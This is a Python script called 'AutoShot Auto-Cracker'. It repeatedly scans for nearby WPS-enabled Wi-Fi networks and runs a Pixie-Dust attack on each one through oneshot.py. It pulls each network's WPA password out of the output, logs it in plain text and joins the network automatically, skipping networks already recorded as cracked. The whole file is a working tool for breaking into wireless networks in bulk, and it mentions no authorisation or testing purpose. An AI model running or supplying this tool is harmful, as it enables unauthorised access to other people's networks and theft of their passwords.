#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AutoShot Auto‑Cracker – Python version
Scans, cracks, and connects to WPS networks in a loop.
"""

import subprocess
import sys
import os
import time
import argparse
import csv
import re
import logging
import shutil
from pathlib import Path
from datetime import datetime

# ---------- Configuration ----------
CRACK_CMD_TEMPLATE = "sudo python oneshot.py -i {interface} -b {bssid} -K -w"
SCAN_CMD_TEMPLATE = "python oneshot.py -i {interface} --scan-only"
CONNECT_CMD_TEMPLATE = "termux-wifi-connection connect {ssid} {psk}"

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('autocracker')

# ---------- Helper functions ----------
def run_command(cmd, capture_output=True, check=False):
    """Run a shell command and return output."""
    try:
        if capture_output:
            result = subprocess.run(cmd, shell=True, check=check,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True)
            return result.stdout.strip(), result.stderr.strip(), result.returncode
        else:
            result = subprocess.run(cmd, shell=True, check=check)
            return "", "", result.returncode
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd}")
        logger.error(f"Error: {e.stderr}")
        return "", e.stderr, e.returncode

def get_wps_networks(interface):
    """Return list of (bssid, essid) from oneshot.py --scan-only."""
    cmd = SCAN_CMD_TEMPLATE.format(interface=interface)
    stdout, stderr, rc = run_command(cmd)
    if rc != 0:
        logger.error(f"Scan failed: {stderr}")
        return []
    lines = stdout.splitlines()
    networks = []
    for line in lines:
        if not line.strip():
            continue
        parts = line.split(maxsplit=1)
        if len(parts) == 2:
            bssid, essid = parts
            networks.append((bssid, essid))
        elif len(parts) == 1:
            networks.append((parts[0], "HIDDEN"))
    return networks

def is_already_cracked(bssid, report_file="reports/stored.csv"):
    """Check if BSSID is already in the stored credentials CSV."""
    report_path = Path(report_file)
    if not report_path.exists():
        return False
    try:
        with open(report_path, 'r', newline='', encoding='utf-8') as f:
            reader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
            # Skip header
            next(reader, None)
            for row in reader:
                if len(row) >= 2 and row[1].strip().upper() == bssid.upper():
                    return True
    except Exception as e:
        logger.warning(f"Could not read stored.csv: {e}")
    return False

def crack_network(interface, bssid):
    """Run Pixie‑Dust attack on a BSSID and return PSK if successful."""
    cmd = CRACK_CMD_TEMPLATE.format(interface=interface, bssid=bssid)
    logger.info(f"Cracking {bssid}...")
    stdout, stderr, rc = run_command(cmd)
    if rc != 0:
        logger.error(f"Crack failed: {stderr}")
        return None

    # Try to extract PSK from stdout
    # Typical line: "[+] WPA PSK: 'password'"
    match = re.search(r"\[\+\] WPA PSK: '([^']+)'", stdout)
    if match:
        psk = match.group(1)
        logger.info(f"Successfully cracked {bssid} – PSK: {psk}")
        return psk
    else:
        # Maybe it was already saved? Check stored.csv again
        # But we already checked before, so likely failed.
        logger.warning(f"No PSK found in output for {bssid}")
        return None

def connect_wifi(ssid, psk):
    """Connect to Wi‑Fi using termux-wifi-connection."""
    cmd = CONNECT_CMD_TEMPLATE.format(ssid=ssid, psk=psk)
    logger.info(f"Connecting to '{ssid}'...")
    _, _, rc = run_command(cmd, capture_output=False)
    if rc == 0:
        logger.info(f"Successfully connected to '{ssid}'")
        return True
    else:
        logger.error(f"Failed to connect to '{ssid}'")
        return False

# ---------- Main loop ----------
def main():
    parser = argparse.ArgumentParser(description="AutoShot Auto‑Cracker (Python)")
    parser.add_argument('-i', '--interface', default='wlan0',
                        help='Wi‑Fi interface (default: wlan0)')
    parser.add_argument('-s', '--interval', type=int, default=300,
                        help='Sleep interval between scan cycles (seconds, default 300)')
    parser.add_argument('--once', action='store_true',
                        help='Run one cycle only and exit')
    parser.add_argument('--no-connect', action='store_true',
                        help='Do not attempt to connect after cracking')
    parser.add_argument('--scan-only', action='store_true',
                        help='Print BSSID and ESSID of all WPS networks and exit')
    parser.add_argument('--skip-cracked', action='store_true', default=True,
                        help='Skip BSSIDs already in reports/stored.csv')
    
    args = parser.parse_args()
    
    # Handle --scan-only flag
    if args.scan_only:
        list_wps_bssids(args.interface)
        return

    # Check for required binary
    if not shutil.which('termux-wifi-connection'):
        logger.error("termux-wifi-connection not found. Please install: pkg install termux-wifi-connection")
        sys.exit(1)

    # Check if oneshot.py exists
    if not os.path.exists('oneshot.py'):
        logger.error("oneshot.py not found in current directory.")
        sys.exit(1)

    logger.info(f"Auto‑Cracker started on interface {args.interface}, interval {args.interval}s")
    logger.info("Press Ctrl+C to stop.")

    while True:
        try:
            logger.info("Scanning for WPS networks...")
            networks = get_wps_networks(args.interface)
            if not networks:
                logger.info("No WPS networks found.")
            else:
                logger.info(f"Found {len(networks)} WPS network(s).")

            for bssid, essid in networks:
                logger.info(f"Processing {bssid} ('{essid}')")

                # Skip if already cracked
                if args.skip_cracked and is_already_cracked(bssid):
                    logger.info(f"Skipping {bssid} – already in stored.csv")
                    continue

                # Attempt to crack
                psk = crack_network(args.interface, bssid)
                if psk:
                    if not args.no_connect:
                        connect_wifi(essid, psk)
                    else:
                        logger.info(f"PSK obtained: {psk} (connection disabled)")
                else:
                    logger.warning(f"Could not crack {bssid}")

            if args.once:
                logger.info("Once‑cycle completed. Exiting.")
                break

            logger.info(f"Cycle complete. Sleeping {args.interval}s...")
            time.sleep(args.interval)

        except KeyboardInterrupt:
            logger.info("Received interrupt, shutting down.")
            break
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(10)  # avoid tight loop on persistent errors

def list_wps_bssids(interface):
    """Print BSSID and ESSID of all WPS networks (one per line) and exit."""
    try:
        from oneshot import WiFiScanner
        scanner = WiFiScanner(interface)
        networks = scanner.iw_scanner()
        if not networks:
            print("No WPS networks found.")
            sys.exit(0)
        for idx, net in networks.items():
            bssid = net['BSSID']
            essid = net.get('ESSID', 'HIDDEN')
            print(f"{bssid} {essid}")
        sys.exit(0)
    except ImportError:
        logger.error("Could not import WiFiScanner from oneshot.py")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Scan error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()